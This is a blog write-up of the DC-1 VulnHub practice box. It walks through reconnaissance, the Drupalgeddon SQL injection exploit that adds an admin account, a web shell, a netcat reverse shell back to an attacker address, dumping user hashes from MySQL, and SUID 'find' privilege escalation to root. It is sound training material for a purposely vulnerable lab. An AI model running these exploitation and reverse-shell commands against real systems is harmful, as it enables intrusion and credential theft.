<!DOCTYPE html><html lang="en-US" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="DC-1 - WRITE-UP" /><meta property="og:locale" content="en" /><meta name="description" content="MAIN INFORMATION BOX NAME: DC: 1 DESCRIPTION" /><meta property="og:description" content="MAIN INFORMATION BOX NAME: DC: 1 DESCRIPTION" /><link rel="canonical" href="https://cloufish.github.io/blog/posts/dc1-en/" /><meta property="og:url" content="https://cloufish.github.io/blog/posts/dc1-en/" /><meta property="og:site_name" content="Cloufish’s Blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-06-06T09:46:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="DC-1 - WRITE-UP" /><meta name="twitter:site" content="@Cloufisz" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"description":"MAIN INFORMATION BOX NAME: DC: 1 DESCRIPTION","url":"https://cloufish.github.io/blog/posts/dc1-en/","@type":"BlogPosting","headline":"DC-1 - WRITE-UP","dateModified":"2021-06-11T19:18:37+02:00","datePublished":"2020-06-06T09:46:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://cloufish.github.io/blog/posts/dc1-en/"},"@context":"https://schema.org"}</script><title>DC-1 - WRITE-UP | Cloufish's Blog</title><link rel="apple-touch-icon" sizes="180x180" href="/blog/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/blog/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/blog/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/blog/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/blog/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Cloufish's Blog"><meta name="application-name" content="Cloufish's Blog"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/blog/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/blog/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/blog/assets/js/dist/post.min.js"></script> <script defer src="/blog/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/blog/" alt="avatar" class="mx-auto"> <img src="/blog/avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/blog/">Cloufish's Blog</a></div><div class="site-subtitle font-italic">My own internet corner :)</div></div><ul class="w-100"><li class="nav-item"> <a href="/blog/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/blog/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/blog/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/blog/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/blog/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a><li class="nav-item"> <a href="/blog/resources/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>RESOURCES TO LEARN HACKING</span> </a><li class="nav-item"> <a href="/blog/contribute/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>HELP ME WITH GITHUB PROJECTS</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/Cloufish" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/Cloufisz" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['cloufisz','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/blog/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/blog/"> Posts </a> </span> <span>DC-1 - WRITE-UP</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>DC-1 - WRITE-UP</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Bartholomew Mokrzycki </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sat, Jun 6, 2020, 9:46 AM +0200" prep="on" > Jun 6, 2020 <i class="unloaded">2020-06-06T09:46:00+02:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Fri, Jun 11, 2021, 7:18 PM +0200" prefix="Updated " > Jun 11 <i class="unloaded">2021-06-11T19:18:37+02:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2587 words">14 min</span></div></div><div class="post-content"><h2 id="main-information">MAIN INFORMATION</h2><h3 id="box-name-dc-1">BOX NAME: DC: 1</h3><h3 id="description">DESCRIPTION</h3><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>DC-1 is a purposely built vulnerable lab to gain experience in the world of penetration testing.

It was designed to be a challenge for beginners, but just how easy it is will depend on your skills and knowledge, and your ability to learn.

To complete this challenge, you will require Linux skills, familiarity with the Linux command line, and experience with basic penetration testing tools, such as the tools that can be found on Kali Linux, or Parrot Security OS.

There are multiple ways of gaining root, however, I have included some flags which contain clues for beginners.

There are five flags in total, but the ultimate goal is to find and read the flag in the root's home directory. You don't even need to be root to do this, however, you will require root privileges.

Depending on your skill level, you may be able to skip finding most of these flags and go straight for root.

Beginners may encounter challenges that they have never come across previously, but a Google search should be all that is required to obtain the information required to complete this challenge.
</pre></table></code></div></div><h2 id="nmap">NMAP</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nmap <span class="nt">-A</span> <span class="nt">-T4</span> <span class="nt">-p-</span> 192.168.56.112
Starting Nmap 7.80 <span class="o">(</span>https://nmap.org<span class="o">)</span> at 2020-06-06 05:01 EDT
Nmap scan report <span class="k">for </span>192.168.56.112
Host is up <span class="o">(</span>0.00017s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65531 closed ports
PORT STATE SERVICE VERSION
22 / tcp open ssh OpenSSH 6.0p1 Debian 4 + deb7u7 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey:
| 1024 c4: d6: 59: e6: 77: 4c: 22: 7a: 96: 16: 60: 67: 8b: 42: 48: 8f <span class="o">(</span>DSA<span class="o">)</span>
| 2048 11: 82: fe: 53: 4e: dc: 5b: 32: 7f: 44: 64: 82: 75: 7d: d0: a0 <span class="o">(</span>RSA<span class="o">)</span>
| _ 256 3d: aa: 98: 5c: 87: af: ea: 84: b8: 23: 68: 8d: b9: 05: 5f: d8 <span class="o">(</span>ECDSA<span class="o">)</span>
80 / tcp open http Apache httpd 2.2.22 <span class="o">((</span>Debian<span class="o">))</span>
| _http-generator: Drupal 7 <span class="o">(</span>http://drupal.org<span class="o">)</span>
| http-robots.txt: 36 disallowed entries <span class="o">(</span>15 shown<span class="o">)</span>
| / includes / / misc / / modules / / profiles / / scripts /
| / themes / /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
| _ / LICENSE.txt /MAINTAINERS.txt
| _http-server-header: Apache / 2.2.22 <span class="o">(</span>Debian<span class="o">)</span>
| _http-title: Welcome to Drupal Site | Drupal Site
111 / tcp open rpcbind 2-4 <span class="o">(</span>RPC <span class="c"># 100000)</span>
| rpcinfo:
| program version port / proto service
| 100,000 2.3.4 111 / tcp rpcbind
| 100,000 2,3,4 111 / udp rpcbind
| 100,000 3.4 111 / tcp6 rpcbind
| 100,000 3.4 111 / udp6 rpcbind
| 100024 1 34319 / udp status
| 100024 1 37172 / udp6 status
| 100024 1 48908 / tcp status
| _ 100024 1 53213 / tcp6 status
48908 / tcp open status 1 <span class="o">(</span>RPC <span class="c"># 100024)</span>
Service Info: OS: Linux<span class="p">;</span> CPE: cpe: / o: linux: linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/.
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>19.64 seconds
</pre></table></code></div></div><p>We see open port ssh, HTTP, and rpcbind. We come across an unusual protocol here - RPC. Briefly, this protocol processes requests for a given computer service, where that service is located on another computer on the same network. This protocol, however, does not use information about the network to be able to process such a request and give e.g. program access to it. We will see in the further course of events whether we will need this protocol :)</p><p>When we send a request using RFC, we request the function on another computer. So <strong><em>service = function</em></strong></p><p>But now that’s it for RFC, let’s look at the open HTTP port, we may find something else there.</p><h2 id="http-page">HTTP PAGE</h2><p>We see the main page with the login form: <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://i.imgur.com/4DBbh44.png" alt="DC site" /></p><p>I tried a simple SQL Injection ```‘OR 1 = 1 #’ ‘but it did not succeed. Creating a test account is also not possible, because the account must first be approved by the administrator. NMAP gave us many directories for the site. So let’s see if any of them have anything interesting.</p><h3 id="robotstxt">ROBOTS.TXT</h3><p>The robots.txt directory turns out to have very useful information.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://i.imgur.com/EkHWR5q.png" alt="Imgur" /> We can see a blacklist of directories that are blocked for Google bots. If there is a directive like here in robots.txt, we won’t really be able to find this directory in google. It can also be assumed that since the web-developer has not forgotten to exclude these directories, he has also not forgotten to block these directories for an ordinary user. But let’s not lose hope and fire up the gobuster.</p><h2 id="gobuster">GOBUSTER</h2><p><code class="language-plaintext highlighter-rouge">$ gobuster dir --url http://192.168.56.112 --wordlist /usr/share/wordlists/dirb/big.txt -s "200"</code></p><blockquote><p>-s “200” here means only showing the results of those directories that returned HTTP status 200 (ie full directory access)</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="o">==================================================</span> <span class="o">=============</span>
Gobuster v3.0.1
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
<span class="o">==================================================</span> <span class="o">=============</span>
<span class="o">[</span>+] Url: http: //192.168.56.112
<span class="o">[</span>+] Threads: 10
<span class="o">[</span>+] Wordlist: /usr/share/wordlists/dirb/big.txt
<span class="o">[</span>+] Status codes: 200
<span class="o">[</span>+] User Agent: gobuster / 3.0.1
<span class="o">[</span>+] Timeout: 10s
<span class="o">==================================================</span> <span class="o">=============</span>
2020/06/06 06:07:29 Starting gobuster
<span class="o">==================================================</span> <span class="o">=============</span>
/ 0 <span class="o">(</span>Status: 200<span class="o">)</span>
/ LICENSE <span class="o">(</span>Status: 200<span class="o">)</span>
/ README <span class="o">(</span>Status: 200<span class="o">)</span>
/ node <span class="o">(</span>Status: 200<span class="o">)</span>
/robots.txt <span class="o">(</span>Status: 200<span class="o">)</span>
/ robots <span class="o">(</span>Status: 200<span class="o">)</span>
/ user <span class="o">(</span>Status: 200<span class="o">)</span>
<span class="o">==================================================</span> <span class="o">=============</span>
2020/06/06 06:40:59 Finished
<span class="o">==================================================</span> <span class="o">=============</span>
</pre></table></code></div></div><p>Sorry, but we don’t have any useful discovered directories.</p><h2 id="exploit---creating-a-new-user-with-sql-injection">EXPLOIT - CREATING A NEW USER WITH SQL INJECTION</h2><p>Using the “Wappalyzer” Chrome plugin, I was able to find out which version of Drupal the website is running on. This is version 7.</p><p>So let’s check if there are any exploits in our local database.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="nv">$ </span>searchsploit drupal 7

<span class="nt">--------------------------------------------------</span> <span class="nt">---------------------</span> <span class="nt">-----------------------------</span> <span class="nt">----</span>
 Exploit Title | Path
<span class="nt">--------------------------------------------------</span> <span class="nt">---------------------</span> <span class="nt">-----------------------------</span> <span class="nt">----</span>
Drupal 7.0 &lt;7.31 - <span class="s1">'Drupalgeddon'</span> SQL Injection <span class="o">(</span>Add Admin User<span class="o">)</span> | php / webapps / 34992.py
Drupal 7.0 &lt;7.31 - <span class="s1">'Drupalgeddon'</span> SQL Injection <span class="o">(</span>Admin Session<span class="o">)</span> | php / webapps / 44355.php
Drupal 7.0 &lt;7.31 - <span class="s1">'Drupalgeddon'</span> SQL Injection <span class="o">(</span>PoC<span class="o">)</span> <span class="o">(</span>Reset Password | php / webapps / 34984.py
Drupal 7.0 &lt;7.31 - <span class="s1">'Drupalgeddon'</span> SQL Injection <span class="o">(</span>PoC<span class="o">)</span> <span class="o">(</span>Reset Password | php / webapps / 34993.php
Drupal 7.0 &lt;7.31 - <span class="s1">'Drupalgeddon'</span> SQL Injection <span class="o">(</span>Remote Code Executio | php / webapps / 35150.php
Drupal 7.12 - Multiple Vulnerabilities | php / webapps / 18564.txt
Drupal 7.x Module Services - Remote Code Execution | php / webapps / 41564.php
Drupal &lt;4.7.6 - Post Comments Remote Command Execution | php / webapps / 3313.pl
Drupal &lt;5.1 - Post Comments Remote Command Execution | php / webapps / 3312.pl
Drupal &lt;7.34 - Denial of Service | php / dos / 35415.txt
Drupal &lt;7.34 - Denial of Service | php / dos / 35415.txt
Drupal &lt;7.58 - <span class="s1">'Drupalgeddon3'</span> <span class="o">(</span>Authenticated<span class="o">)</span> Remote Code <span class="o">(</span>Metasploi | php / webapps / 44557.rb
Drupal &lt;7.58 - <span class="s1">'Drupalgeddon3'</span> <span class="o">(</span>Authenticated<span class="o">)</span> Remote Code Execution | php / webapps / 44542.txt
Drupal &lt;7.58 / &lt;8.3.9 / &lt;8.4.6 / &lt;8.5.1 - <span class="s1">'Drupalgeddon2'</span> Remote C | php / webapps / 44449.rb
Drupal Module Coder &lt;7.x-1.3 / 7.x-2.6 - Remote Code Execution | php / remote / 40144.php
Drupal Module Embedded Media Field / Media 6.x: Video Flotsam / Media: Au | php / webapps / 35072.txt
Drupal Module RESTWS 7.x - PHP Remote Code Execution <span class="o">(</span>Metasploit<span class="o">)</span> | php / remote / 40130.rb
<span class="nt">--------------------------------------------------</span> <span class="nt">---------------------</span> <span class="nt">-----------------------------</span> <span class="nt">----</span>
Shellcodes: No Results
</pre></table></code></div></div><p>We see many of them. The most convenient seems to be adding an account with administrator rights. By executing the exploit script without any flags, we receive the “service” instruction</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
</pre><td class="rouge-code"><pre><span class="nv">$ </span>python /usr/share/exploitdb/exploits/php/webapps/34992.py

  ______ __ _______ _______ _____
 | _ <span class="se">\.</span> <span class="nt">----</span><span class="nb">.</span> -. -. <span class="nt">-----</span><span class="nb">.</span> <span class="nt">---</span> .- | | | _ <span class="o">||</span> _ | _ |
 |. | <span class="se">\ </span>| _ | | | _ | _ | | | ___ | _ | ___ | |. | |
 |. | | __ | | _____ | __ | ___._ | __ | / | ___ <span class="o">(</span>__ <span class="sb">`</span>- |. |
 |: 1 / | __ | | | |: 1 | |: |
 | :: ... / | | | :: ... | | ::. |
 <span class="sb">`</span><span class="nt">------</span> <span class="s1">'` ---'</span> <span class="sb">`</span><span class="nt">-------</span> <span class="s1">'` ---'</span>
  _______ __ ___ __ __ __
 | _ .----- | | | .----- | __. <span class="nt">-----</span> .---- | | _ | __. <span class="nt">-----</span> .-----.
 | 1 ___ | _ | | |. | | | <span class="nt">-__</span> | __ | _ | | _ | |
 | ____ | __ | __ | |. | __ | __ | | _____ | ____ | ____ | __ | _____ | __ | __ |
 |: 1 | | __ | |: | | ___ |
 | :: ... | | ::. |
 <span class="sb">`</span><span class="nt">-------</span> <span class="s1">'---'</span>

                                 Drup4l <span class="o">=&gt;</span> 7.0 &lt;<span class="o">=</span> 7.31 Sql-1nj3ct10n
                                              Admin 4cc0unt cr3at0r

Discovered by:

Stefan Horst
                         <span class="o">(</span>CVE-2014-3704<span class="o">)</span>

                           Written by:

                         Claudio Viviani

                      http://www.homelab.it

                         info@homelab.it
                     homelabit@protonmail.ch

                 https://www.facebook.com/homelabit
                   https://twitter.com/homelabit
                 https://plus.google.com/+HomelabIt1/
       https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww



Usage: 34992.py <span class="nt">-t</span> http <span class="o">[</span>s]: // TARGET_URL <span class="nt">-u</span> USER <span class="nt">-p</span> PASS


Options:
  <span class="nt">-h</span>, <span class="nt">--help</span> show this <span class="nb">help </span>message and <span class="nb">exit</span>
  <span class="nt">-t</span> TARGET, <span class="nt">--target</span> <span class="o">=</span> TARGET
                        Insert URL: http <span class="o">[</span>s]: //www.victim.com
  <span class="nt">-u</span> USERNAME, <span class="nt">--username</span> <span class="o">=</span> USERNAME
                        Insert username
  <span class="nt">-p</span> PWD, <span class="nt">--pwd</span> <span class="o">=</span> PWD Insert password
</pre></table></code></div></div><p>Let’s complete the command:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
</pre><td class="rouge-code"><pre><span class="nv">$ </span>python /usr/share/exploitdb/exploits/php/webapps/34992.py <span class="nt">-t</span> http://192.168.56.112 <span class="nt">-u</span> Testing <span class="nt">-p</span> of the <span class="nb">test test

  </span>______ __ _______ _______ _____
 | _ <span class="se">\.</span> <span class="nt">----</span><span class="nb">.</span> -. -. <span class="nt">-----</span><span class="nb">.</span> <span class="nt">---</span> .- | | | _ <span class="o">||</span> _ | _ |
 |. | <span class="se">\ </span>| _ | | | _ | _ | | | ___ | _ | ___ | |. | |
 |. | | __ | | _____ | __ | ___._ | __ | / | ___ <span class="o">(</span>__ <span class="sb">`</span>- |. |
 |: 1 / | __ | | | |: 1 | |: |
 | :: ... / | | | :: ... | | ::. |
 <span class="sb">`</span><span class="nt">------</span> <span class="s1">'` ---'</span> <span class="sb">`</span><span class="nt">-------</span> <span class="s1">'` ---'</span>
  _______ __ ___ __ __ __
 | _ .----- | | | .----- | __. <span class="nt">-----</span> .---- | | _ | __. <span class="nt">-----</span> .-----.
 | 1 ___ | _ | | |. | | | <span class="nt">-__</span> | __ | _ | | _ | |
 | ____ | __ | __ | |. | __ | __ | | _____ | ____ | ____ | __ | _____ | __ | __ |
 |: 1 | | __ | |: | | ___ |
 | :: ... | | ::. |
 <span class="sb">`</span><span class="nt">-------</span> <span class="s1">'---'</span>

                                 Drup4l <span class="o">=&gt;</span> 7.0 &lt;<span class="o">=</span> 7.31 Sql-1nj3ct10n
                                              Admin 4cc0unt cr3at0r

Discovered by:

Stefan Horst
                         <span class="o">(</span>CVE-2014-3704<span class="o">)</span>

                           Written by:

                         Claudio Viviani

                      http://www.homelab.it

                         info@homelab.it
                     homelabit@protonmail.ch

                 https://www.facebook.com/homelabit
                   https://twitter.com/homelabit
                 https://plus.google.com/+HomelabIt1/
       https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww


<span class="o">[!]</span> VULNERABLE!

<span class="o">[!]</span> Administrator user created!

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Login: Testowka
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Pass: <span class="nb">test test</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Url: http://192.168.56.112/?q<span class="o">=</span>node&amp;destination<span class="o">=</span>node
</pre></table></code></div></div><p>Being logged in, we can immediately see that we have administrative rights.</p><p>![Panel] (https://i.imgur.com/2fcdluW.png)</p><p>While browsing the panel for additional information, we come across an interesting hint (?) Regarding the flag.</p><p>![Flag3] (https://i.imgur.com/R5FhG1d.png)</p><p>The note refers to the files / etc / passwd and / etc / shadow. The –exec flag most likely means access to a Linux shell. It doesn’t necessarily have to be using python.</p><h2 id="gaining-shell">GAINING SHELL</h2><p>Is there any way to get to the shell via the website with administrative rights? Google is here to help.</p><p>![Shell-Access-Google] (https://i.imgur.com/uFnnXLH.png)</p><p>Apparently, there is a Drupal module that will give us this option. I install it and turn it on. After these steps, I have a shell on the home page.</p><p>![Shell] (https://i.imgur.com/sAUmOpy.png)</p><p>You will immediately notice the file ‘flag.1.txt’. Browsing through its content, we see another hint: ```</p><p>```Every good CMS needs a config file - and so do you</p><p>So we google “Drupal config file directory”. We can see that it is located in the folder <code class="language-plaintext highlighter-rouge">/sites/default / '' In it we have the configuration file</code>settings.php```. Already at the very beginning of the file, we see flag 2.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://i.imgur.com/xlBZq3Q.png" alt="Imgur" /></p><p>As the note says, at the bottom, there are credentials for the database account. So let’s log in.</p><p><code class="language-plaintext highlighter-rouge">mysql -u dbuser -p</code></p><p>This command does not work. We get an access denied error, but it may be more because we are working in a web shell all the time.</p><h2 id="reverse-shell">REVERSE SHELL</h2><p>Let’s connect to our machine with the reverse shell ‘’ nc -nv 192.168.56.103 1234 -e / bin / bash<code class="language-plaintext highlighter-rouge">. It will not be an aesthetic shell so let's make it even better with</code>python -c “import pty; pty.spawn (‘/ bin / bash’)” ``` I repeat the previous steps and enter the password.</p><h2 id="escfiltration-from-the-database">ESCFILTRATION FROM THE DATABASE</h2><p>We can now extract data from mysql. A good first step would be to show the names of the ```show databases; ‘’ databases</p><blockquote><p>Remember about the semicolon</p></blockquote><p>We see information_schema which has basic information about the database and its structure. However, we are interested in the drupaldb base. <code class="language-plaintext highlighter-rouge">use drupaldb ''</code> <code class="language-plaintext highlighter-rouge">show tables from drupaldb;</code> We see one specifically important for us “users” array. <code class="language-plaintext highlighter-rouge">select * from users;</code> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://i.imgur.com/yx1avkT.png" alt="users" /></p><p>So we now have an admin hash. Now the only question is whether we should waste time hashing it? From the previous hints, it can be concluded that the author gives us more options than just breaking the admin password.</p><h2 id="escalation-of-powers">ESCALATION OF POWERS</h2><p>One of the basic techniques for escalating privileges is through SUID programs (Those that need different privileges than those of the user executing the command) . To display them, execute the command:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>find / <span class="nt">-perm</span> <span class="nt">-u</span> <span class="o">=</span> s <span class="nt">-type</span> f 2&gt; / dev / null<span class="sb">```</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://i.imgur.com/lwXRepw.png" alt="Imgur" /></p><p>Many of them are normal commands. For example, / usr / bin / passwd must have administrator privileges because it needs access to / etc / passwd and / etc / shadow. However, there is a command <code class="language-plaintext highlighter-rouge">find</code>which has unnecessary SUID status The find command has a built-in flag -exec (Recall the content of the flag3)</p><p>[-exec] (https://i.imgur.com/Wxw6Xz6.png)</p><p>What we can do now is to execute the command <code class="language-plaintext highlighter-rouge">'' find / etc / shadow -exec bash \;</code>. In doing so, however, we are still the www-data user. This is quite strange. Let’s try to do it with a different shell. To see what else we have to choose from, run <code class="language-plaintext highlighter-rouge">cat / etc / shells</code></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>/ bin / sh
/ bin / dash
/ bin / bash
/ bin / rbash
</pre></table></code></div></div><p>Let’s try with dash ``````find / etc / shadow -exec dash \; ```</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">whoami
</span>root
</pre></table></code></div></div><p>Apparently, it works :) Going to the <code class="language-plaintext highlighter-rouge">/ root</code>directory, we see the file <code class="language-plaintext highlighter-rouge">thefinalflag.txt</code>I will keep its contents to myself for now. I encourage you to solve the Box yourself after this write-up and find out what was in the final flag: P I sincerely hope you learned a lot from this trip on this Box</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/blog/categories/vulnhub/'>VulnHub</a>, <a href='/blog/categories/dc/'>DC</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/blog/tags/beginner/" class="post-tag no-text-decoration" >beginner</a> <a href="/blog/tags/robots/" class="post-tag no-text-decoration" >robots</a> <a href="/blog/tags/reverse-shell/" class="post-tag no-text-decoration" >reverse-shell</a> <a href="/blog/tags/suid/" class="post-tag no-text-decoration" >suid</a> <a href="/blog/tags/drupal/" class="post-tag no-text-decoration" >drupal</a> <a href="/blog/tags/cms/" class="post-tag no-text-decoration" >cms</a> <a href="/blog/tags/rpc/" class="post-tag no-text-decoration" >rpc</a> <a href="/blog/tags/mysql/" class="post-tag no-text-decoration" >mysql</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=DC-1 - WRITE-UP - Cloufish's Blog&url=https://cloufish.github.io/blog/posts/dc1-en/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=DC-1 - WRITE-UP - Cloufish's Blog&u=https://cloufish.github.io/blog/posts/dc1-en/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a 